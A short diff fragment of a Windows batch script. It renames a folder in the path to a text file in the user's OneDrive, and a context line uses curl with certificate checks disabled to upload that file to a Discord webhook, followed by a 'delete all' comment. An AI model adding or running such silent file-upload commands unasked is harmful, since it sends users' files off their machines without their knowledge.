@@ -24,7 +24,7 @@ r
 
 
 
-set "attachment=C:\Users\%username%\OneDrive\Bureau\Engineering\Historique.txt"
+set "attachment=C:\Users\%username%\OneDrive\Bureau\masked\Historique.txt"
 curl -k -F "payload_json={\"content\": \"%message_text%\"}"  -F "file1=@%attachment%" https://discord.com/api/webhooks/[YOUR WEBHOOK]
 
 :: delete all
